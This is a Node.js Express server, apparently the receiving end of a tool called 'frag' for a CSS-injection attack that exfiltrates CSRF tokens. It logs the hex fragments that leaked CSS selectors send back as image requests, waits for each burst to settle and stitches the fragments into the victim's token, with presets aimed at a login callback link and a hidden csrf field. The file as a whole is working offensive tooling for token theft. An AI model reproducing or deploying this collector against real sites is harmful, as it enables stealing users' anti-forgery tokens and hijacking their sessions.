const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { tryStitch } = require('./lib/stitch');

const G = '\x1b[32m';
const R = '\x1b[31m';
const Y = '\x1b[33m';
const D = '\x1b[2m';
const B = '\x1b[1m';
const X = '\x1b[0m';

function printBanner() {
  console.log(String.raw`
                                      \ | /
                                    -- * --
                                     / | \
                                ____/
                              _/
                           __/__
                          /_____/
               __________/     /
              /          \____/
             /                \          _______
            /                  \        /       \
           /     __________     \      /   c2e   \
          /     /          \     \     \         /
         /     /            \     \     \_______/
        /     /    {    }    \     /
        \     \              /   /         _______
         \     \____________/   /         /       \
          \                    /         /   2e1   \
           \                  /          \         /
            \                /            \_______/
             \______________/
                                          _______
                                         /       \
                                        /   e16   \
                                        \         /
                                         \_______/

          ______  _____       _       ____
         |  ____||  __ \     / \     / ___|
         | |__   | |__) |   / _ \   | |  _
         |  __|  |  _  /   / ___ \  | |_| |
         |_|     |_| \_\  /_/   \_\  \____|
`);
}

const PRESETS = {
  anchor: {
    selector: 'a[href^="https://example.com/m/callback/email?token="]',
    attribute: 'href',
    tokenName: 'CSRF token',
    startSelector: 'token=',
    endSelector: '&operation=login',
    tokenLength: 40,
    windowSize: 4,
  },
  hidden: {
    selector: 'input[type="hidden"][name="csrf"]',
    attribute: 'value',
    tokenName: 'csrf',
    startSelector: '',
    endSelector: '',
    tokenLength: 40,
    windowSize: 4,
  },
};

function parseSelector(selector) {
  const tagMatch = selector.match(/^([\w-]+)/);
  const tag = tagMatch ? tagMatch[1] : 'div';

  const prefixMatch = selector.match(/\[[\w-]+\^="([^"]*)"\]/);
  const selectorPrefix = prefixMatch ? prefixMatch[1] : '';

  return { tag, selectorPrefix };
}

const PIXEL = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

function buildConfig(userConfig) {
  const { tag, selectorPrefix } = parseSelector(userConfig.selector);
  const attribute = userConfig.attribute || 'href';
  const tokenLength = userConfig.tokenLength || 40;
  // 4-char windows: ~99% single-guess accuracy at 40 chars but ~4.5 MB of CSS.
  // 3-char windows: ~300 KB, but longer tokens often come back as candidates.
  const windowSize = Number(userConfig.windowSize) === 3 ? 3 : 4;
  const sampleToken = crypto.randomBytes(Math.ceil(tokenLength / 2)).toString('hex').slice(0, tokenLength);
  const valuePrefix = selectorPrefix || userConfig.startSelector;
  const sampleExtra = userConfig.endSelector ? '&state=medium&rememberMe=false' : '';
  const sampleValue = valuePrefix + sampleToken + userConfig.endSelector + sampleExtra;

  let sampleHtml;
  if (tag === 'input') {
    const attrs = [...userConfig.selector.matchAll(/\[([\w-]+)="([^"]*)"\]/g)]
      .filter(([, name]) => name !== attribute);
    let attrStr = attrs.map(([, name, value]) => `${name}="${value}"`).join(' ');
    if (attrStr) attrStr = ' ' + attrStr;
    sampleHtml = `<input${attrStr} ${attribute}="${sampleValue}"><span style="color:#e0e0e0;word-break:break-all;font-size:13px">${sampleValue}</span>`;
  } else {
    sampleHtml = `<${tag} ${attribute}="${sampleValue}">${sampleValue}</${tag}>`;
  }

  const startContext = userConfig.startSelector ? userConfig.startSelector.slice(-2) : '';
  const endContext = userConfig.endSelector ? userConfig.endSelector.slice(0, 2) : '';

  // Hex windows in the known text around the token (e.g. "bac" in "callback")
  // will leak too; the solver treats them as expected leftovers.
  const contextHexChunks = new Set();
  const isWindow = new RegExp(`^[0-9a-f]{${windowSize}}$`);
  for (const str of [valuePrefix, userConfig.endSelector || '', sampleExtra]) {
    for (let i = 0; i + windowSize <= str.length; i++) {
      const w = str.slice(i, i + windowSize);
      if (isWindow.test(w)) contextHexChunks.add(w);
    }
  }

  return {
    config: {
      selector: userConfig.selector,
      tokenName: userConfig.tokenName,
      attribute,
      tag,
      startContext,
      endContext,
      useStartsWith: !userConfig.startSelector,
      useEndsWith: !userConfig.endSelector,
      sampleToken,
      sampleHtml,
      tokenLength,
      windowSize,
    },
    contextHexChunks,
  };
}

const app = express();
const PORT = 3000;

// The browser fires every request for one extraction in a single burst, but
// they can arrive in any order and the start/end usually arrive before most
// middle chunks. Stitching mid-burst can produce a plausible but wrong token,
// so wait until no request has arrived for this long before stitching.
const SETTLE_MS = Number(process.env.FRAG_SETTLE_MS ?? 1000);

function emptyState() {
  return { start: null, end: null, chunks: [], log: [], lastAt: 0, dirty: true, cached: null };
}

let currentConfig, contextHexChunks, tokenLength, state;

function applyConfig(userConfig) {
  const result = buildConfig(userConfig);
  currentConfig = result.config;
  contextHexChunks = result.contextHexChunks;
  tokenLength = currentConfig.tokenLength;
  state = emptyState();
}

applyConfig(PRESETS.anchor);

app.use(express.static(path.join(__dirname, 'public')));
app.use('/graphics', express.static(path.join(__dirname, 'graphics')));
app.use(express.json());

app.get('/config', (req, res) => res.json(currentConfig));

app.post('/api/config', (req, res) => {
  applyConfig(req.body);
  console.log(`\n${G}${B}config updated${X}`);
  console.log(`${D}selector: ${currentConfig.selector}${X}`);
  console.log(`${D}attribute: ${currentConfig.attribute}${X}`);
  console.log(`${D}length: ${currentConfig.tokenLength}${X}`);
  console.log(`${D}window: ${currentConfig.windowSize}${X}\n`);
  res.json(currentConfig);
});

function record(t, c, res) {
  const now = Date.now();
  if (t === 's') {
    // A start marks a new extraction, but requests from the same burst may
    // have overtaken it, so keep anything that arrived just before it.
    const early = state.log.filter(r => r.at >= now - SETTLE_MS);
    state = emptyState();
    state.start = c;
    for (const r of early) {
      if (r.t === 'e') state.end = r.c;
      else state.chunks.push(r.c);
    }
    state.log = early;
    console.log(`\n${G}--- new extraction ---${X}`);
    console.log(`${D}start:${X} ${c}`);
    if (early.length) console.log(`${D}kept ${early.length} request(s) that arrived before the start${X}`);
  } else if (t === 'e') {
    state.end = c;
    console.log(`${D}end:${X}   ${c}`);
  } else {
    state.chunks.push(c);
    console.log(`${D}chunk #${state.chunks.length}:${X} ${c}`);
  }
  state.log.push({ t, c, at: now });
  state.lastAt = now;
  state.dirty = true;
  res.type('gif').send(PIXEL);
}

app.get('/s/:c([0-9a-f]+)', (req, res) => record('s', req.params.c, res));
app.get('/e/:c([0-9a-f]+)', (req, res) => record('e', req.params.c, res));
app.get('/:c([0-9a-f]+)', (req, res) => record('m', req.params.c, res));

app.get('/api/token', (req, res) => {
  if (!state.start) {
    return res.json({ status: 'waiting' });
  }
  if (Date.now() - state.lastAt < SETTLE_MS) {
    return res.json({ status: 'partial', start: state.start, end: state.end, chunks: state.chunks.length });
  }
  if (!state.dirty && state.cached) {
    return res.json(state.cached);
  }
  const result = tryStitch(state, {
    windowSize: currentConfig.windowSize,
    tokenLength,
    context: contextHexChunks,
  });
  if (result) {
    if (result.candidates) {
      const more = result.truncated ? '+' : '';
      console.log(`\n${Y}${B}ambiguous (${result.candidates.length}${more} candidates, ${result.length} chars):${X}`);
      result.candidates.forEach(c => console.log(`  ${c}`));
    } else {
      console.log(`\n${G}${B}recovered token (${result.length} chars):${X} ${result.token}`);
    }
    state.cached = {
      status: 'ok',
      token: result.token,
      length: result.length,
      candidates: result.candidates,
      truncated: result.truncated,
    };
  } else {
    state.cached = {
      status: 'partial',
      start: state.start,
      end: state.end,
      chunks: state.chunks.length,
    };
  }
  state.dirty = false;
  res.json(state.cached);
});

app.get('/api/reset', (req, res) => {
  state = emptyState();
  console.log(`${D}state reset${X}`);
  res.json({ status: 'ok' });
});

if (require.main === module) {
  app.listen(PORT, () => {
    printBanner();
    console.log(`${G}${B}frag${X} listening on ${B}http://localhost:${PORT}${X}`);
    console.log(`${D}visit http://localhost:${PORT} in your browser to get started${X}\n`);
  });
}

module.exports = { app, buildConfig, PRESETS };
